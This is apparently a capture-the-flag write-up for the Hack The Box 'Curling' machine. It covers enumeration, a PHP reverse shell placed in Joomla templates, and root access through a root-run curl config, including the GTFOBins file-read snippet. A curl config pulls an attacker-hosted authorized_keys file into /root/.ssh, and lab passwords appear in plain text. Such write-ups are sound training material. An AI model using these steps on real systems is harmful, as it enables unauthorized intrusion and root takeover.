# Curling

---

## Enumeration

- Nmap scan showed ports 22, 80 ports open:

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8ad169b490203ea7b65401eb68303aca (RSA)
|   256 9f0bc2b20bad8fa14e0bf63379effb43 (ECDSA)
|_  256 c12a3544300c5b566a3fa5cc6466d9a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA
|_http-title: Home
|_http-generator: Joomla! - Open Source Content Management
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Found secret.txt in page source
- got b64 text, decoded to `Curling2018!`
- used cewl on site to get wordlist
- user is `Floris`

---

## Lateral Movement

- Got rev shell using PHP webshell in templates as www-data
- found password-backup in /home/floris, a hex dump
- used xxd -r password-backup, kept decompressing it until i got password.txt
- `5d<wdCbdZu)|hChXll` is password for floris on the machine
- user flag.

---

## Priv Esc

- got pspy64 on the machine and ran it
- found root running curl -K and reading config file from file input
- https://gtfobins.github.io/gtfobins/curl/#suid url can be file:///
- poc: get file:///etc/passwd -> get /root/root.txt

```
It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

The file path must be absolute.

LFILE=/tmp/file_to_read
curl file://$LFILE
```

### I used a different method!

1. Generated ssh key pair on my local machine
2. id_rsa.pub into authorized_keys and started python http server
3. edited the config file for curl on victim machine:

```
url = "http:/10.10.16.2/authorized_keys"
output = "/root/.ssh/authorized_keys"
```

4. login with id_rsa as root!

---

